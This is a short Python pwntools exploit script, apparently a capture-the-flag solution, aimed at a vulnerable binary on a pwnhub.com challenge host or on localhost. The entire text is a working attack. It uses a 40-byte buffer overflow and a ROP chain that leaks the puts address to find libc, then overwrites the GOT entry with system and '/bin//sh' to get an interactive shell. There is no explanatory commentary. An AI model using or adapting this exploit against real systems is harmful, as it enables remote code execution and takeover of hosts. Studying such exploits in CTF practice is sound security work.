#!/usr/bin/env python
import time
from pwn import *

context.arch = 'amd64'
context.os = 'linux'
context.log_level = 'debug'
context.terminal = ['terminator', '-x', 'bash', '-c']

#r = remote("pwnhub.com", 56026)
r = remote("127.0.0.1", 8888)

puts_plt = 0x4004e0
puts_got = 0x601018
puts_off = 0x6f690
gets_plt = 0x400510
pop_rdi = 0x4006f3
system_off = 0x45390

rop = flat([pop_rdi, puts_got, puts_plt])
rop += flat([pop_rdi, puts_got, gets_plt])
rop += flat([pop_rdi, puts_got+8, puts_plt])

payload = "a"*40
payload += rop

r.recvuntil(":")
raw_input("payload")
r.sendline(payload)
time.sleep(0.1)

r.recvuntil("!\n")
puts_adr = u64(r.recvuntil("\n")[:-1].ljust(8,"\x00"))
libc = puts_adr - puts_off
system = libc + system_off
print "puts addr: ", hex(puts_adr)
print "libc: ", hex(libc)

payload2 = p64(system) + "/bin//sh"
raw_input("payload2")
r.sendline(payload2)

r.interactive()
